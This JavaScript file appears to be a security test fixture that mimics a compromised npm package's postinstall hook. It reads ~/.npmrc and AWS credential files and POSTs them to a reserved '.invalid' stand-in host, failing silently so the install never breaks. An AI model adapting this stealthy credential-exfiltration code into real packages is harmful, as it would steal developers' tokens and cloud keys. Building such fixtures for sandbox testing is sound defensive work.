'use strict';

/* ============================================================================
 * SECURITY TEST FIXTURE — DO NOT SHIP, DO NOT INSTALL OUTSIDE THE DEMO VM
 * ----------------------------------------------------------------------------
 * This file simulates the "malicious postinstall" behaviour of a compromised
 * npm dependency so that the sandbox product has something realistic to
 * contain. It is designed to be inert outside the demo environment:
 *
 *   1. The collector host uses the `.invalid` TLD (RFC 6761). It can never be
 *      delegated, so DNS is always NXDOMAIN and the payload can never reach a
 *      real destination, even if this file is run on a real workstation.
 *   2. assertInertEndpoint() below hard-aborts if the destination host is ever
 *      changed to something outside `.invalid`, so the fixture cannot be
 *      quietly repurposed into a working exfiltrator.
 *   3. The demo VM blocks outbound network and only contains canary
 *      credentials, so the observable behaviour is "attempt detected,
 *      nothing delivered".
 *
 * Behavioural goal: behave exactly like real supply-chain malware (read
 * credential files, POST them out, stay silent, never fail the install) so
 * the sandbox alerting is exercised honestly.
 * ========================================================================== */

const os = require('os');
const fs = require('fs');
const path = require('path');
const https = require('https');

const ENDPOINT = 'https://collector.airlock-demo.invalid/upload';
const TIMEOUT_MS = 5000;

/* --------------------------------------------------------------------------
 * Never fail the install. Registered first so nothing below can take down
 * `npm install`, no matter what happens.
 * ------------------------------------------------------------------------ */
function bail() {
  // Exit code 0 always. A postinstall that returns non-zero would break the
  // install, and real malware has no interest in advertising itself.
  process.exit(0);
}

process.on('uncaughtException', bail);
process.on('unhandledRejection', bail);

// Watchdog. unref() means it never keeps the event loop alive on its own, but
// it still fires while a stuck socket is pending — which is the case that
// would otherwise hang the install (DNS/connect can stall past the socket
// timeout).
setTimeout(bail, TIMEOUT_MS + 1000).unref();

/* --------------------------------------------------------------------------
 * Inert-destination guard.
 * ------------------------------------------------------------------------ */
function assertInertEndpoint(urlString) {
  const url = new URL(urlString);
  if (!url.hostname.endsWith('.invalid')) {
    throw new Error(
      `refusing to run: ${url.hostname} is not an RFC 6761 reserved host; ` +
      'this fixture is only permitted to target a non-routable .invalid endpoint'
    );
  }
  return url;
}

/* --------------------------------------------------------------------------
 * Credential collection (the part the sandbox is meant to catch).
 * ------------------------------------------------------------------------ */
function readIfPresent(file) {
  try {
    if (!fs.existsSync(file)) return null;
    const contents = fs.readFileSync(file, 'utf8');
    if (!contents.trim()) return null;
    return {
      path: file,
      size: Buffer.byteLength(contents),
      contents,
    };
  } catch (err) {
    // Unreadable / EACCES / weird symlink — record the attempt, keep going.
    return { path: file, error: String((err && err.message) || err) };
  }
}

function collect() {
  const home = os.homedir();
  const targets = [
    path.join(home, '.npmrc'),
    path.join(home, '.aws', 'credentials'),
  ];

  const files = [];
  for (const target of targets) {
    const entry = readIfPresent(target);
    if (entry) files.push(entry);
  }

  return {
    package: 'left-padder',
    version: readVersion(),
    event: 'postinstall',
    reportedAt: new Date().toISOString(),
    platform: process.platform,
    arch: process.arch,
    node: process.version,
    user: safeUsername(),
    home,
    files,
  };
}

function readVersion() {
  try {
    return require(path.join(__dirname, 'package.json')).version;
  } catch (err) {
    return 'unknown';
  }
}

function safeUsername() {
  try {
    return os.userInfo().username;
  } catch (err) {
    return process.env.USER || process.env.USERNAME || 'unknown';
  }
}

/* --------------------------------------------------------------------------
 * Exfiltration attempt.
 * ------------------------------------------------------------------------ */
function upload(url, payload) {
  return new Promise((resolve) => {
    let settled = false;
    const done = () => {
      if (settled) return;
      settled = true;
      resolve();
    };

    const body = Buffer.from(JSON.stringify(payload), 'utf8');

    const req = https.request(
      {
        hostname: url.hostname,
        port: url.port || 443,
        path: url.pathname || '/',
        method: 'POST',
        headers: {
          'content-type': 'application/json',
          'content-length': body.length,
          'user-agent': 'left-padder/1.4.3',
        },
        timeout: TIMEOUT_MS,
      },
      (res) => {
        // Drain so the socket can close; the status is irrelevant to us.
        res.resume();
        res.on('data', () => {});
        res.on('end', done);
        res.on('error', done);
      }
    );

    req.setTimeout(TIMEOUT_MS, () => {
      req.destroy(new Error('timeout'));
    });

    req.on('error', done);
    req.on('close', done);

    req.write(body);
    req.end();
  });
}

/* --------------------------------------------------------------------------
 * Entry point.
 * ------------------------------------------------------------------------ */
async function main() {
  const url = assertInertEndpoint(ENDPOINT);
  const payload = collect();
  await upload(url, payload);
}

main()
  .catch(() => {})
  .then(() => {
    process.exitCode = 0;
  });
